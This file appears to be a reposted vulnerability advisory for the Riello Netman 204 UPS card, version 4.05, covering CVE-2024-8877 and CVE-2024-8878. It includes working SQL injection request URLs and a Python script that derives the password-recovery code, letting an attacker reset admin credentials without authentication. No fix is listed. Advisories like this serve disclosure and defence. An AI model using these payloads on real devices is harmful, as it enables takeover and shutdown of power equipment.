@@ -1,0 +1,115 @@
+id: 39757
+date: 09/24/2024
+title: Netman 204 4.05 SQL Injection / Unauthenticated Password Reset Vulnerabilities
+author: Tim Weber
+cves: CVE-2024-8877, CVE-2024-8878
+
+-------------------------------------------------------------------------------
+                title| Multiple Vulnerabilities
+              product| Netman 204
+   vulnerable version| 4.05
+        fixed version| -
+           CVE number| CVE-2024-8877, CVE-2024-8878
+               impact| High
+             homepage| https://www.riello-ups.com/
+                found| 2024-05-17
+                   by| D. Blagojevic (Office Vienna)
+                     | S. Dietz (Office Vienna)
+                     | T. Weber (Office Vienna)
+                     | CyberDanube Security Research
+                     | Vienna | St. Pölten
+                     |
+                     | https://www.cyberdanube.com
+-------------------------------------------------------------------------------
+
+Vendor description
+-------------------------------------------------------------------------------
+"Riello Elettronica, lead by Cav. Lav. Pierantonio Riello, has a presence today
+in the Electrical manufacturing industry with two divisions: Energy, Automation
+and Security. It is a leader in the Uninterruptible Power Supply market with
+the well-known brand Riello UPS.
+Energy represents the Group’s core business, in particular with the manufacture
+of UPS that are firstly able to guarantee the quality of electricity and
+secondly maintain normal operation and continuity in case of blackouts or
+anomalies in the energy supply.
+Riello UPS designs and produces strategical solutions for every kind of
+requirement and make a bespoke offering according to the clients’ needs: from
+banks to the hospitals, transport to infrastructures, from domestic use to data
+centres."
+
+Source: https://www.riello-ups.com/pages/41-the-riello-elettronica-group
+
+
+Vulnerable versions
+-------------------------------------------------------------------------------
+NetMan 204 / 4.05
+
+Vulnerability overview
+-------------------------------------------------------------------------------
+1) SQL Injection (CVE-2024-8877)
+The three endpoints /cgi-bin/db_datalog_w.cgi, /cgi-bin/db_eventlog_w.cgi, and
+/cgi-bin/db_multimetr_w.cgi are vulnerable to SQL injection without prior
+authentication. This enables an attacker to modify the collected log data in an
+arbitrary way.
+
+2) Unauthenticated Password Reset (CVE-2024-8878)
+By navigating to the endpoint /recoverpassword.html an attacker can gather the
+netmanid from the UPS. This id can be used to calculate the recovery code for
+resetting the password. This way enables an attacker to take over control of
+the UPS and e.g. turn it off.
+
+
+Proof of Concept
+-------------------------------------------------------------------------------
+1) SQL Injection (CVE-2024-8877)
+The system is subsceptible to SQL injections, which is illustrated by the
+following payloads:
+
+AND 1=0:
+/cgi-bin/db_eventlog_w.cgi?date_start=1715609000&date_end=1715630160&
+gravity=%25&type=%25%27and/**/%271%27=%270
+
+AND 1=1:
+/cgi-bin/db_eventlog_w.cgi?date_start=1715609000&date_end=1715630160&
+gravity=%25&type=%25%27and/**/%271%27=%271
+
+The first request does not return any data, while the second request returns
+all entries with a start and end date in the given interval.
+
+2) Unauthenticated Password Reset (CVE-2024-8878)
+The following python script can be used to generate the recovery code from the
+netmanid:
+
+import hashlib
+import sys
+def calc_code(netman_id):
+    secret = b"NMP"
+    netman_id = secret + netman_id[3:]
+    round1 = hashlib.md5(netman_id).hexdigest().encode('utf-8')
+    round2 = hashlib.sha1(round1).hexdigest()
+    code = round2[5:5+7]
+    return code
+if len(sys.argv) < 2:
+    sys.exit("usage: {} netman_id".format(sys.argv[0]))
+netman_id = sys.argv[1]
+print(calc_code(netman_id.encode('utf-8'))
+
+Inputting the recovery code in /recoverpassword.html resets the login
+credentials to admin:admin.
+
+
+Solution
+-------------------------------------------------------------------------------
+None
+
+Workaround
+-------------------------------------------------------------------------------
+Limit access to the device.
+
+Recommendation
+-------------------------------------------------------------------------------
+Riello should release a firmware update that fixes the mentioned
+vulnerabilities.
+Customers should not use this device in productive networks.
+
+#  0day.today [2024-09-27]  #
